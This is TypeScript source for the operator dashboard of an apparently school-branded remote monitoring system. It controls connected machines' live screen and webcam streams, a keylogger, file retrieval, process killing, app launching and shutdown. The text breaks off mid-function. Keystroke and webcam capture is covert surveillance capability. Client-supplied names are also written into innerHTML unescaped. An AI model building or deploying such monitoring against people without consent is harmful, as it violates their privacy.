// @ts-ignore
import JMuxer from "jmuxer";
import { GatewayWsClient } from "./ws/client";

// --- State ---
interface Client {
    id: number;
    status: "online" | "offline";
    lastSeen: number;
    name?: string;
    // Persistent Data
    keylogs: string;
    logs: string[];
    processes: Process[];
    apps: AppInfo[];  // Per-client app list
    // Persistent Feature State
    state: {
        monitor: "idle" | "starting" | "active" | "stopping";
        webcam: "idle" | "starting" | "active" | "stopping";
        keylogger: "idle" | "starting" | "active" | "stopping";
    };
    // Per-client streaming resources (browser-like tabs)
    jmuxerScreen?: any;
    jmuxerWebcam?: any;
    videoContainerId?: string;
}

interface Process {
    pid: string;
    name: string;
    user: string;
    cmd: string;
}

interface AppInfo {
    id: string;
    name: string;
    icon: string;
    exec: string;
    keywords?: string; // Optional but good to have
}

let clients: Map<number, Client> = new Map();
let activeClientId: number | null = null;
let wsClient: GatewayWsClient;

// NOTE: Global JMuxers removed - now using per-client JMuxers stored in Client object

// Process Manager State
let currentAppList: AppInfo[] = [];
let processSearchTerm: string = "";
let processAutoRefreshInterval: any = null;

// --- DOM Elements ---
const elClientList = document.getElementById("client-list")!;
// const elMainContent = document.getElementById("main-content")!;
const elViewHome = document.getElementById("view-home")!;
const elViewClient = document.getElementById("view-client")!;
const elHeaderClientName = document.getElementById("header-client-name")!;

const statusConnection = document.getElementById("status-connection")!;
// const statusLatency = document.getElementById("status-latency")!;

// Client Controls
const btnStreamScreen = document.getElementById("btn-stream-screen") as HTMLButtonElement;
const btnStreamWebcam = document.getElementById("btn-stream-webcam") as HTMLButtonElement;
const btnKeylogToggle = document.getElementById("btn-keylog-toggle") as HTMLButtonElement;
const btnFullscreenScreen = document.getElementById("btn-fullscreen-screen")!;

const btnKill = document.getElementById("btn-kill")!;
const btnShutdown = document.getElementById("btn-shutdown")!;
const btnRestart = document.getElementById("btn-restart")!;
const inpSearchProc = document.getElementById("inp-search-proc") as HTMLInputElement;
const btnClearSearch = document.getElementById("btn-clear-search")!; // New button
const elProcessListBody = document.getElementById("process-list-body")!;
const chkSelectAll = document.getElementById("chk-select-all-procs") as HTMLInputElement;

// --- Config ---
const WS_URL = "ws://localhost:8080"; // Gateway on Windows Docker

// --- Initialization ---
console.log("🚀 SafeSchool Dashboard Initializing...");

// NOTE: initJMuxers() removed - JMuxers are now created per-client
initWebSocket();
initEvents();

// --- WebSocket ---
function initWebSocket() {
    wsClient = new GatewayWsClient({
        onLog: (msg) => console.log("[WS]", msg),
        onStatus: (s) => {
            statusConnection.textContent = `● ${s}`;
            statusConnection.style.color = s === "CONNECTED" ? "var(--neon-green)" : "var(--destructive)";
        },
        onClientId: (id) => {
            console.log("🆔 My Client ID:", id);
            discoverBackends();
        },
        onGatewayText: (text) => console.log("📢 Gateway:", text),
        onBackendActive: (id) => {
            addOrUpdateClient(id, "online");
        },
        onBackendFrame: (ev) => {
            addOrUpdateClient(ev.backendId, "online");

            // Get the specific client
            const c = clients.get(ev.backendId);
            if (!c) return;

            // Handle Video & Binary - ALWAYS feed to client's own JMuxer (background decoding)
            if (ev.kind === "binary") {
                if (!ev.payload || ev.payload.byteLength === 0) return;

                const view = new DataView(ev.payload);
                const type = view.getUint8(0);

                if (type === 0x01) { // Screen
                    // Feed to THIS CLIENT's JMuxer (continues even when hidden)
                    if (c.state.monitor !== "idle" && c.jmuxerScreen) {
                       c.jmuxerScreen.feed({ video: new Uint8Array(ev.payload.slice(1)) });
                    }
                } else if (type === 0x02) { // Webcam
                    if (c.state.webcam !== "idle" && c.jmuxerWebcam) {
                       c.jmuxerWebcam.feed({ video: new Uint8Array(ev.payload.slice(1)) });
                    }
                } else if (type === 0x03) {
                    // File Download: [0x03][4B len][Name][Bytes]
                    const nameLen = view.getUint32(1, false); // Big Endian
                    const nameBytes = new Uint8Array(ev.payload.slice(5, 5 + nameLen));
                    const fileName = new TextDecoder().decode(nameBytes);
                    const fileData = new Uint8Array(ev.payload.slice(5 + nameLen));

                    const blob = new Blob([fileData], { type: "application/octet-stream" });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement("a");
                    a.href = url;
                    a.download = fileName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    console.log("📥 Downloaded:", fileName);
                }
            } else if (ev.kind === "jpeg") {
                // Fallback for MJPEG if needed
                console.warn("Received JPEG, but expecting H.264");
            }

            // Handle Text Responses (ALWAYS process, even if background)
            if (ev.kind === "text") {
                handleBackendText(ev.backendId, ev.text);
            }
        },
        onClose: () => {
            setTimeout(() => wsClient.connect(WS_URL), 2000);
        }
    });

    wsClient.connect(WS_URL);
}

// NOTE: initJMuxers function removed - JMuxers are now created per-client in initClientVideoResources()

function discoverBackends() {
    if (wsClient.isConnected()) wsClient.sendText(0, "ping");
    setTimeout(discoverBackends, 5000); // Ping loop
}

// --- Logic ---

// Initialize per-client video resources (browser-like tabs)
function initClientVideoResources(c: Client) {
    const containerId = `client-video-container-${c.id}`;
    c.videoContainerId = containerId;

    // Check if container already exists
    if (document.getElementById(containerId)) return;

    // Create container with video elements for this client
    const container = document.createElement("div");
    container.id = containerId;
    container.className = "client-video-container";
    container.style.display = "none"; // Hidden by default
    container.innerHTML = `
        <video id="monitor-video-${c.id}" class="client-monitor-video" autoplay muted></video>
        <video id="webcam-video-${c.id}" class="client-webcam-video" autoplay muted></video>
    `;

    // Append to a hidden container in the DOM
    let hiddenContainer = document.getElementById("hidden-video-containers");
    if (!hiddenContainer) {
        hiddenContainer = document.createElement("div");
        hiddenContainer.id = "hidden-video-containers";
        hiddenContainer.style.cssText = "position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; pointer-events: none;";
        document.body.appendChild(hiddenContainer);
    }
    hiddenContainer.appendChild(container);

    // Create JMuxers for this client
    c.jmuxerScreen = new JMuxer({
        node: `monitor-video-${c.id}`,
        mode: 'video',
        flushingTime: 0,
        fps: 30,
        debug: false
    });

    c.jmuxerWebcam = new JMuxer({
        node: `webcam-video-${c.id}`,
        mode: 'video',
        flushingTime: 0,
        fps: 15,
        debug: false
    });

    console.log(`📺 Initialized video resources for Client #${c.id}`);
}

function addOrUpdateClient(id: number, status: "online" | "offline") {
    let c = clients.get(id);
    if (!c) {
        c = {
            id,
            status,
            lastSeen: Date.now(),
            keylogs: "",
            logs: [],
            processes: [],
            apps: [],
            state: {
                monitor: "idle",
                webcam: "idle",
                keylogger: "idle"
            }
        };
        clients.set(id, c);

        // Initialize per-client video resources
        initClientVideoResources(c);

        renderClientList();
    } else {
        c.status = status;
        c.lastSeen = Date.now();
    }
    return c;
}

function renderClientList() {
    elClientList.innerHTML = "";
    if (clients.size === 0) {
        elClientList.innerHTML = `<div class="p-4 text-muted text-sm">Scanning...</div>`;
        return;
    }

    clients.forEach((c) => {
        const div = document.createElement("div");
        div.className = `client-item ${c.id === activeClientId ? "active" : ""}`;
        div.innerHTML = `
            <div class="flex items-center gap-2">
                <div class="status-indicator ${c.status}"></div>
                <span class="font-mono font-bold">${c.name ? c.name : `Client #${c.id}`}</span>
            </div>
            <span class="text-xs text-muted">ID: ${c.id}</span>
        `;
        div.onclick = () => setActiveClient(c.id);
        elClientList.appendChild(div);
    });
}

function setActiveClient(id: number | null) {
    if (activeClientId === id) return; // No change

    activeClientId = id;
    renderClientList(); // Update active class

    // Clear old interval
    if (processAutoRefreshInterval) clearInterval(processAutoRefreshInterval);

    // Get main video elements (always visible in UI)
    const mainMonitorVideo = document.getElementById("monitor-video") as HTMLVideoElement;
    const mainWebcamVideo = document.getElementById("webcam-video") as HTMLVideoElement;

    if (!id) {
        elViewHome.style.display = "flex";
        elViewClient.style.display = "none";
        elHeaderClientName.textContent = "Overview";

        // Clear main videos when no client selected
        if (mainMonitorVideo) {
            mainMonitorVideo.srcObject = null;
            mainMonitorVideo.src = "";
        }
        if (mainWebcamVideo) {
            mainWebcamVideo.srcObject = null;
            mainWebcamVideo.src = "";
        }
        return;
    }

    const c = clients.get(id);
    if (!c) return;

    elHeaderClientName.textContent = c.name || `Client #${id}`;
    elViewHome.style.display = "none";
    elViewClient.style.display = "grid";

    // === BROWSER-LIKE TAB SWITCH: Swap video sources ===
    // Get this client's hidden video elements
    const clientMonitorVideo = document.getElementById(`monitor-video-${id}`) as HTMLVideoElement;
    const clientWebcamVideo = document.getElementById(`webcam-video-${id}`) as HTMLVideoElement;

    // Swap: Copy srcObject from client's hidden video to main visible video
    if (clientMonitorVideo && mainMonitorVideo) {
        if (clientMonitorVideo.srcObject) {
            mainMonitorVideo.srcObject = clientMonitorVideo.srcObject;
        } else {
            // Fallback: capture stream from client's video
            try {
                const stream = (clientMonitorVideo as any).captureStream?.() || (clientMonitorVideo as any).mozCaptureStream?.();
                if (stream) mainMonitorVideo.srcObject = stream;
            } catch (e) {
                console.warn("Could not capture stream, using direct src copy");
                mainMonitorVideo.src = clientMonitorVideo.src;
            }
        }
    }

    if (clientWebcamVideo && mainWebcamVideo) {
        if (clientWebcamVideo.srcObject) {
            mainWebcamVideo.srcObject = clientWebcamVideo.srcObject;
        } else {
            try {
                const stream = (clientWebcamVideo as any).captureStream?.() || (clientWebcamVideo as any).mozCaptureStream?.();
                if (stream) mainWebcamVideo.srcObject = stream;
            } catch (e) {
                console.warn("Could not capture stream, using direct src copy");
                mainWebcamVideo.src = clientWebcamVideo.src;
            }
        }
    }

    // Restore Keylogs
    const keylogFeed = document.getElementById("keylog-feed");
    if (keylogFeed) {
        keylogFeed.innerText = c.keylogs;
        keylogFeed.scrollTop = keylogFeed.scrollHeight;
    }

    // Restore Process List (from cache - instant display)
    renderProcessListForClient(c);

    // Restore App List (from cache - instant display)
    renderApplications(c.apps);

    // Restore Button States
    updateUIForClientState(c);

    // REQUEST ACTUAL STATE FROM BACKEND (for sync after page refresh)
    wsClient.sendText(id, "get_state");

    // Start Auto-Refresh (UI polling) - request fresh data
    wsClient.sendText(id, "list_process");
    wsClient.sendText(id, "list_apps");
    processAutoRefreshInterval = setInterval(() => {
        if (activeClientId === id) {
            wsClient.sendText(id, "list_process");
            wsClient.sendText(id, "list_apps");
        }
    }, 5000);
}

function updateUIForClientState(c: Client) {
    // === Monitor Button ===
    switch (c.state.monitor) {
        case "starting":
            btnStreamScreen.textContent = "Starting...";
            btnStreamScreen.classList.remove("btn-destructive", "btn-primary");
            btnStreamScreen.classList.add("btn-warning");
            btnStreamScreen.disabled = true;
            break;
        case "active":
            btnStreamScreen.textContent = "Stop Stream";
            btnStreamScreen.classList.remove("btn-primary", "btn-warning");
            btnStreamScreen.classList.add("btn-destructive");
            btnStreamScreen.disabled = false;
            break;
        case "stopping":
            btnStreamScreen.textContent = "Stopping...";
            btnStreamScreen.classList.remove("btn-destructive", "btn-primary");
            btnStreamScreen.classList.add("btn-warning");
            btnStreamScreen.disabled = true;
            break;
        default: // idle
            btnStreamScreen.textContent = "Start Stream";
            btnStreamScreen.classList.remove("btn-destructive", "btn-warning");
            btnStreamScreen.classList.add("btn-primary");
            btnStreamScreen.disabled = false;
    }

    // === Webcam Button ===
    switch (c.state.webcam) {
        case "starting":
            btnStreamWebcam.textContent = "Starting...";
            btnStreamWebcam.classList.remove("btn-destructive", "btn-success");
            btnStreamWebcam.classList.add("btn-warning");
            btnStreamWebcam.disabled = true;
            break;
        case "active":
            btnStreamWebcam.textContent = "Stop Cam";
            btnStreamWebcam.classList.remove("btn-success", "btn-warning");
            btnStreamWebcam.classList.add("btn-destructive");
            btnStreamWebcam.disabled = false;
            break;
        case "stopping":
            btnStreamWebcam.textContent = "Stopping...";
            btnStreamWebcam.classList.remove("btn-destructive", "btn-success");
            btnStreamWebcam.classList.add("btn-warning");
            btnStreamWebcam.disabled = true;
            break;
        default: // idle
            btnStreamWebcam.textContent = "Start Cam";
            btnStreamWebcam.classList.remove("btn-destructive", "btn-warning");
            btnStreamWebcam.classList.add("btn-success");
            btnStreamWebcam.disabled = false;
    }

    // === Keylogger Button ===
    const elKeylogStatus = document.getElementById("keylog-status")!;
    switch (c.state.keylogger) {
        case "starting":
            btnKeylogToggle.textContent = "Starting...";
            btnKeylogToggle.classList.remove("btn-destructive");
            btnKeylogToggle.classList.add("btn-warning");
            btnKeylogToggle.disabled = true;
            elKeylogStatus.textContent = "Starting...";
            elKeylogStatus.style.color = "var(--neon-yellow)";
            break;
        case "active":
            btnKeylogToggle.textContent = "Disable Keylogger";
            btnKeylogToggle.classList.remove("btn-warning");
            btnKeylogToggle.classList.add("btn-destructive");
            btnKeylogToggle.disabled = false;
            elKeylogStatus.textContent = "Recording...";
            elKeylogStatus.style.color = "var(--neon-green)";
            break;
        case "stopping":
            btnKeylogToggle.textContent = "Stopping...";
            btnKeylogToggle.classList.remove("btn-destructive");
            btnKeylogToggle.classList.add("btn-warning");
            btnKeylogToggle.disabled = true;
            elKeylogStatus.textContent = "Stopping...";
            elKeylogStatus.style.color = "var(--neon-yellow)";
            break;
        default: // idle
            btnKeylogToggle.textContent = "Enable Keylogger";
            btnKeylogToggle.classList.remove("btn-destructive", "btn-warning");
            btnKeylogToggle.disabled = false;
            elKeylogStatus.textContent = "Stopped";
            elKeylogStatus.style.color = "var(--muted)";
    }
}

function handleBackendText(id: number, text: string) {
    // 1. Get Client Model
    let c = clients.get(id);
    if (!c) {
        c = addOrUpdateClient(id, "online");
    }

    // === STATE SYNC PROTOCOL ===
    if (text.startsWith("STATUS:SYNC:")) {
        const syncPart = text.substring(12); // Remove "STATUS:SYNC:"
        const [feature, state] = syncPart.split("=");
        const isActive = state === "active";

        console.log(`🔄 State sync: ${feature} = ${isActive ? "ACTIVE" : "INACTIVE"}`);

        switch (feature) {
            case "monitor":
                c.state.monitor = isActive ? "active" : "idle";
                break;
            case "webcam":
                c.state.webcam = isActive ? "active" : "idle";
                break;
            case "keylogger":
                c.state.keylogger = isActive ? "active" : "idle";
                break;
            case "complete":
                console.log("✅ State sync complete!");
                break;
        }
        if (activeClientId === id) updateUIForClientState(c);
        return;
    }

    // === STATUS MESSAGE PROTOCOL ===
    if (text.startsWith("STATUS:")) {
        const [_, feature, state] = text.split(":");

        if (feature === "MONITOR_STREAM") {
            if (state === "STARTING") c.state.monitor = "starting";
            else if (state === "STARTED") c.state.monitor = "active";
            else if (state === "STOPPED") c.state.monitor = "idle";
        } else if (feature === "WEBCAM_STREAM") {
             if (state === "STARTING") c.state.webcam = "starting";
            else if (state === "STARTED") c.state.webcam = "active";
            else if (state === "STOPPED") c.state.webcam = "idle";
        } else if (feature === "KEYLOGGER") {
             if (state === "STARTING") c.state.keylogger = "starting";
            else if (state === "STARTED") c.state.keylogger = "active";
            else if (state === "STOPPED") c.state.keylogger = "idle";
        }

        // If this client is currently visible, update UI
        if (activeClientId === id) updateUIForClientState(c);
        return;
    }

    // === ERROR MESSAGE PROTOCOL ===
    if (text.startsWith("ERROR:")) {
        const [_, feature, reason] = text.split(":");
        const friendlyReason = reason.replace(/_/g, " ").toLowerCase();
        if (activeClientId === id) alert(`❌ ${feature.replace(/_/g, " ")}: ${friendlyReason}`);

        // Reset button states on error
        if (feature === "MONITOR_STREAM") {
            c.state.monitor = "idle";
        } else if (feature === "WEBCAM_STREAM") {
            c.state.webcam = "idle";
        }
        if (activeClientId === id) updateUIForClientState(c);
        return; // Don't process as normal text
    }

    // === DATA ===
    // Keylogger Data
    if (text.startsWith("KEYLOG: ")) {
        const char = text.substring(8);
        c.keylogs += char; // Store persistently

        // Update View if active
        if (activeClientId === id) {
            const feed = document.getElementById("keylog-feed");
            if (feed) {
                // Append just the new char to avoid flickering or scroll jump,
                // but checking innerText match is cleaner for now
                feed.innerText = c.keylogs;
                feed.scrollTop = feed.scrollHeight;
            }
        }
    }
    // Process List response (Apps or Procs)
    else if (text.startsWith("DATA:APPS:")) {
         const payload = text.substring(10);
         // Handle empty list
         if(!payload) {
             c.apps = [];
             if (activeClientId === id) renderApplications(c.apps);
             return;
         }

         const apps: AppInfo[] = payload.split(';').map(item => {
             const parts = item.split('|');
             return {
                 id: parts[0],
                 name: parts[1],
                 icon: parts[2] || "",
                 exec: parts[3] || "",
                 keywords: parts[4] || ""
             };
         });

         // Store per-client
         c.apps = apps;

         // Only render if this client is active
         if (activeClientId === id) renderApplications(c.apps);
    }
    else if (text.startsWith("DATA:PROCS:") || (text.includes("PID") && text.includes("NAME"))) { // Fallback for old/new format
         console.log("✅ Received Process List response");
         if (text.startsWith("DATA:PROCS:")) {
             parseProcessList(id, text.substring(11));
         } else if (text.includes("PID")) {
             // old format, unlikely if Backend updated
             parseProcessList(id, text); // Pass the whole text for old format parsing
         }
    }
    // Command feedback
    else if (text.startsWith("OK:")) {
        console.log("Success:", text);
        const msg = text.substring(4);
        if (activeClientId === id) {
            alert("✅ Success: " + msg);
            const status = document.getElementById("status-message");
            if(status) status.textContent = "Last Action: " + msg;
        }
    }
    else if (text.startsWith("INFO:NAME=")) { // Fixed space
        const name = text.substring(10).trim();
        c.name = name;
        renderClientList();
        if (activeClientId === id) elHeaderClientName.textContent = name;
    }
    else if (text.startsWith("ERROR:")) {
        if (activeClientId === id) alert("❌ " + text);
    }
}

// --- Process Manager Logic ---

function parseProcessList(clientId: number, raw: string) {
    const c = clients.get(clientId);
    if (!c) return;

    // Format: PID|Name|Icon|Exec|Status;...
    const items = raw.split(';');
    c.processes = [];

    items.forEach(item => {
        if (!item.trim()) return;
        const parts = item.split('|');
        if (parts.length < 2) { // Fallback for old format (PID NAME USER CMD)
            const oldParts = item.trim().split(/\s+/);
            if (oldParts.length >= 2) {
                c.processes.push({
                    pid: oldParts[0],
                    name: oldParts[1],
                    user: oldParts[2] || "N/A",
                    cmd: oldParts.slice(3).join(" ") || oldParts[1]
                });
            }
            return;
        }

        c.processes.push({
            pid: parts[0],
            name: parts[1],
            user: "User", // Placeholder till backend provides it
            cmd: parts[3] || parts[1]
        });
    });

    if (activeClientId === clientId) renderProcessListForClient(c);
}

function renderProcessListForClient(c: Client) {
    elProcessListBody.innerHTML = "";

    // Filter
    const filtered = c.processes.filter(p => {
        if (!processSearchTerm) return true;
        const term = processSearchTerm.toLowerCase();
        return p.name.toLowerCase().includes(term) ||
               p.pid.includes(term) ||
               p.cmd.toLowerCase().includes(term);
    });

    const fragment = document.createDocumentFragment();

    filtered.forEach(p => {
        const displayCmd = p.cmd || p.name;
        const tr = document.createElement("tr");
        tr.innerHTML = `
            <td><input type="checkbox" class="chk-proc-row" data-pid="${p.pid}"></td>
            <td>${p.pid}</td>
            <td class="text-primary truncate" style="max-width: 200px;" title="${displayCmd}">${p.name}</td>
            <td>${p.user}</td>
            <td><button class="btn btn-sm btn-destructive btn-kill-proc" data-pid="${p.pid}">Kill</button></td>
        `;
        fragment.appendChild(tr);
    });

    elProcessListBody.appendChild(fragment);

    // Sync App Status Overlay
    if(currentAppList && currentAppList.length > 0) {
        renderApplications(currentAppList);
    }
}


// --- Event Handlers (Updated for State Machine) ---

const handleStreamToggle = (type: 'monitor' | 'webcam' | 'keylogger') => {
    if (!activeClientId) return;
    const c = clients.get(activeClientId);
    if (!c) return;

    if (type === 'monitor') {
        if (c.state.monitor === 'idle') {
            c.state.monitor = 'starting';
            updateUIForClientState(c);
            wsClient.sendText(activeClientId, "start_monitor_stream");
        } else if (c.state.monitor === 'active') {
            c.state.monitor = 'stopping';
            updateUIForClientState(c);
            wsClient.sendText(activeClientId, "stop_monitor_stream");
        }
    } else if (type === 'webcam') {
        // Similar for webcam
        if (c.state.webcam === 'idle') {
            c.state.webcam = 'starting';
             updateUIForClientState(c);
            wsClient.sendText(activeClientId, "start_webcam_stream");
        } else if (c.state.webcam === 'active') {
            c.state.webcam = 'stopping';
             updateUIForClientState(c);
            wsClient.sendText(activeClientId, "stop_webcam_stream");
        }
    } else if (type === 'keylogger') {
        if (c.state.keylogger === 'idle') {
            c.state.keylogger = 'starting';
             updateUIForClientState(c);
            wsClient.sendText(activeClientId, "start_keylog");
        } else if (c.state.keylogger === 'active') {
            c.state.keylogger = 'stopping';
             updateUIForClientState(c);
            wsClient.sendText(activeClientId, "stop_keylog");
        }
    }
};

function initEvents() {
    // Theme Toggle
    const btnThemeToggle = document.getElementById("btn-theme-toggle")!;

    // Init Theme
    const savedTheme = localStorage.getItem("theme") || "dark";
    document.documentElement.setAttribute("data-theme", savedTheme);
    btnThemeToggle.textContent = savedTheme === "dark" ? "🌙" : "☀️";

    btnThemeToggle.addEventListener("click", () => {
        const current = document.documentElement.getAttribute("data-theme");
        const next = current === "light" ? "dark" : "light";
        document.documentElement.setAttribute("data-theme", next);
        localStorage.setItem("theme", next);
        btnThemeToggle.textContent = next === "dark" ? "🌙" : "☀️";
    });

    // Auto-ping removed from manual button, but discoverBackends loop still runs.

    // Recording Buttons
    const btnRecordScreen = document.getElementById("btn-record-screen")!;
    const btnRecordWebcam = document.getElementById("btn-record-webcam")!;

    btnRecordScreen.onclick = () => {
        if(activeClientId) {
            wsClient.sendText(activeClientId, "record_screen_10s");
            btnRecordScreen.textContent = "Recording...";
            btnRecordScreen.setAttribute("disabled", "true");
            setTimeout(() => {
                btnRecordScreen.textContent = "Rec (10s)";
                btnRecordScreen.removeAttribute("disabled");
            }, 10000);
        }
    };

    btnRecordWebcam.onclick = () => {
        if(activeClientId) {
            wsClient.sendText(activeClientId, "record_webcam_10s");
            btnRecordWebcam.textContent = "Recording...";
            btnRecordWebcam.setAttribute("disabled", "true");
            setTimeout(() => {
                btnRecordWebcam.textContent = "Rec (10s)";
                btnRecordWebcam.removeAttribute("disabled");
            }, 10000);
        }
    };

    // Fullscreen
    btnFullscreenScreen.addEventListener("click", () => {
        const el = document.getElementById("monitor-video");
        if (el && el.requestFullscreen) el.requestFullscreen();
    });

    // Stream Buttons
    btnStreamScreen.onclick = () => handleStreamToggle('monitor');
    btnStreamWebcam.onclick = () => handleStreamToggle('webcam');

    // Keylogger
    btnKeylogToggle.onclick = () => handleStreamToggle('keylogger');
    const btnKeylogDownload = document.getElementById("btn-keylog-download") as HTMLButtonElement;
    btnKeylogDownload.onclick = () => { if(activeClientId) wsClient.sendText(activeClientId, "get_keylog"); };

    // Webcam Fullscreen
    const btnFullscreenWebcam = document.getElementById("btn-fullscreen-webcam")!;
    btnFullscreenWebcam.onclick = () => {
        const el = document.getElementById("webcam-video");
        if (el && el.requestFullscreen) el.requestFullscreen();
    };

    // --- Search & Process ---

    const handleSearch = (() => {
        let timeout: any;
        return () => {
            clearTimeout(timeout);
            timeout = setTimeout(() => {
                processSearchTerm = inpSearchProc.value.toLowerCase().trim();
                if (activeClientId) {
                    const c = clients.get(activeClientId);
                    if(c) renderProcessListForClient(c);
                }
                // Toggle Clear Button
                if (processSearchTerm) {
                    btnClearSearch.style.display = "block";
                    inpSearchProc.style.border = "1px solid var(--neon-cyan)";
                    inpSearchProc.style.boxShadow = "0 0 5px var(--neon-cyan)";
                } else {
                    btnClearSearch.style.display = "none";
                    inpSearchProc.style.border = "";
                    inpSearchProc.style.boxShadow = "";
                }
            }, 300);
        };
    })();
    inpSearchProc.addEventListener("input", handleSearch);

    // Clear Button Logic
    btnClearSearch.onclick = () => {
        inpSearchProc.value = "";
        processSearchTerm = "";
        btnClearSearch.style.display = "none";
        inpSearchProc.style.border = "";
        inpSearchProc.style.boxShadow = "";
        inpSearchProc.focus();
        if (activeClientId) {
             const c = clients.get(activeClientId);
             if(c) renderProcessListForClient(c);
        }
    };

    // Select All
    chkSelectAll.onchange = () => {
        const checkboxes = document.querySelectorAll(".chk-proc-row") as NodeListOf<HTMLInputElement>;
        checkboxes.forEach(kb => {
            // Only select visible rows
            if (kb.closest("tr")?.isConnected) {
                kb.checked = chkSelectAll.checked;
            }
        });
    };

    // Multi-Kill
    btnKill.onclick = () => {
         if (!activeClientId) return;
         const checked = document.querySelectorAll(".chk-proc-row:checked");
         if (checked.length === 0) return alert("No processes selected!");

         if (confirm(`Kill ${checked.length} selected processes?`)) {
             checked.forEach((kb: any) => {
                 const pid = kb.getAttribute("data-pid");
                 if (pid) wsClient.sendText(activeClientId!, `kill_process ${pid}`);
             });
             // No need for setTimeout, the auto-refresh interval will handle it
         }
    };

    // Process List Delegation (Kill Button)
    elProcessListBody.addEventListener("click", (e) => {
        const target = e.target as HTMLElement;
        const btn = target.closest(".btn-kill-proc");

        if (btn) {
            const pid = btn.getAttribute("data-pid");
            if (pid && activeClientId) {
                if (confirm(`Are you sure you want to KILL process ${pid}?`)) {
                    wsClient.sendText(activeClientId, `kill_process ${pid}`);
                    // No need for setTimeout, the auto-refresh interval will handle it
                }
            }
        }
    });

    // Client Shutdown
    btnShutdown.onclick = () => { if(activeClientId && confirm(`Are you sure you want to SHUTDOWN Client #${activeClientId}?`)) wsClient.sendText(activeClientId, "shutdown"); };

    // Client Restart
    btnRestart.onclick = () => { if(activeClientId && confirm(`Are you sure you want to RESTART Client #${activeClientId}?`)) wsClient.sendText(activeClientId, "restart"); };

    // --- New Process & App Features ---
    const inpStartProc = document.getElementById("inp-start-proc") as HTMLInputElement;
    const btnStartProcExec = document.getElementById("btn-start-proc-exec")!;
    const inpSearchApps = document.getElementById("inp-search-apps") as HTMLInputElement; // NEW

    // ... (btnStartProcExec logic) ...

    btnStartProcExec.onclick = () => {
        const cmd = inpStartProc.value.trim();
        if(cmd && activeClientId) {
            wsClient.sendText(activeClientId, `launch_app ${cmd}`); // Fixed to use launch_app
            inpStartProc.value = "";
        }
    };

    // Search Apps Logic
    let searchTimeout: any = null;
    inpSearchApps.addEventListener("input", () => {
        clearTimeout(searchTimeout);
        const query = inpSearchApps.value.trim();
        searchTimeout = setTimeout(() => {
             if(activeClientId) {
                 if(query) wsClient.sendText(activeClientId!, `search_apps ${query}`);
                 else wsClient.sendText(activeClientId!, "list_apps");
             }
        }, 300);
    });

    // Auto-Refresh Apps Loop (every 5 seconds)
    setInterval(() => {
        if(activeClientId) {
             const query = inpSearchApps.value.trim();
             if(query) wsClient.sendText(activeClientId, `search_apps ${query}`);
             else wsClient.sendText(activeClientId, "list_apps");
        }
    }, 5000);

    // Bulk App Actions
    const chkSelectAllApps = document.getElementById("chk-select-all-apps") as HTMLInputElement;
    const btnLaunchSelected = document.getElementById("btn-launch-selected")!;
    const btnKillSelected = document.getElementById("btn-kill-selected")!;

    if(chkSelectAllApps) {
        chkSelectAllApps.onchange = () => {
            const checkboxes = document.querySelectorAll(".chk-app-row") as NodeListOf<HTMLInputElement>;
            checkboxes.forEach(kb => {
                if (kb.closest("tr")?.isConnected) kb.checked = chkSelectAllApps.checked;
            });
        };
    }

    if(btnLaunchSelected) {
        btnLaunchSelected.onclick = () => {
            if(!activeClientId) return;
            const checked = document.querySelectorAll(".chk-app-row:checked");
            if(checked.length === 0) return alert("No applications selected");

            let count = 0;
            checked.forEach((cb: any) => {
                const appId = cb.getAttribute("data-id");
                const app = currentAppList.find(a => a.id === appId);
                // Smart Launch: Only if STOPPED
                if(app && getAppPids(app).length === 0) {
                    wsClient.sendText(activeClientId!, `start_app ${app.id}`);
                    count++;
                }
            });

            if(count === 0 && checked.length > 0) alert("All selected apps are already running.");
        };
    }

    if(btnKillSelected) {
        btnKillSelected.onclick = () => {
            if(!activeClientId) return;
            const checked = document.querySelectorAll(".chk-app-row:checked");
            if(checked.length === 0) return alert("No applications selected");

            let count = 0;
            checked.forEach((cb: any) => {
                const appId = cb.getAttribute("data-id");
                const app = currentAppList.find(a => a.id === appId);
                // Smart Kill: Only if RUNNING
                if(app) {
                    const pids = getAppPids(app);
                    if(pids.length > 0) {
                        pids.forEach(pid => wsClient.sendText(activeClientId!, `kill_process ${pid}`));
                        count++;
                    }
                }
            });

             if(count === 0 && checked.length > 0) alert("None of the selected apps are running.");
        };
    }
}

// Store latest apps for re-rendering when process list updates
// (currentAppList declared at top)

// Helper to check if app is running
function getAppPids(app: AppInfo): string[] {
    // Get processes from active client
    if (!activeClientId) return [];
    const client = clients.get(activeClientId);
    if (!client) return [];

    // extract binary name from start cmd
    let binName = app.exec.split(' ')[0].split('/').pop()?.toLowerCase();
    if (!binName) return [];

    return client.processes
        .filter((p: Process) => {
             const pName = p.name.toLowerCase();
             const pCmd = p.cmd.toLowerCase();
             // Match either exact name or substring in cmd
             return pName === binName || pCmd.includes(binName!);
        })
        .map((p: Process) => p.pid);
}

function renderApplications(apps: AppInfo[]) {
    currentAppList = apps; // Cache it
    const tbody = document.getElementById("app-list-body");
    if(!tbody) return;
    tbody.innerHTML = "";

    if (apps.length === 0) {
        tbody.innerHTML = "<tr><td colspan='4' class='text-center text-muted p-4'>No applications found.</td></tr>";
        return;
    }

    apps.forEach(app => {
        const tr = document.createElement("tr");
        tr.className = "proc-row"; // Reuse process row styling for hover

        // State Check
        const pids = getAppPids(app);
        const isRunning = pids.length > 0;

        // Checkbox
        const tdCheck = document.createElement("td");
        tdCheck.innerHTML = `<input type="checkbox" class="chk-app-row" data-id="${app.id}">`;

        // App Info
        const tdName = document.createElement("td");
        tdName.innerHTML = `
            <div class="flex items-center gap-3">
                <div class="text-xl">🚀</div>
                <div>
                    <div class="font-bold text-white">${app.name}</div>
                    <div class="text-xs text-muted" style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${app.exec}</div>
                </div>
            </div>
        `;

        // Status
        const tdStatus = document.createElement("td");
        if (isRunning) {
            tdStatus.innerHTML = `<span class="badge badge-success display-inline-flex align-center gap-1">● Running <span class="text-xs opacity-50">(${pids.length})</span></span>`;
        } else {
            tdStatus.innerHTML = `<span class="badge badge-neutral">Stopped</span>`;
        }

        // Actions
        const tdAction = document.createElement("td");
        tdAction.style.textAlign = "right";

        if (isRunning) {
            // Kill Button
            const btnKill = document.createElement("button");
            btnKill.className = "btn btn-xs btn-destructive";
            btnKill.innerHTML = "💀 Kill";
            btnKill.onclick = (e) => {
                e.stopPropagation();
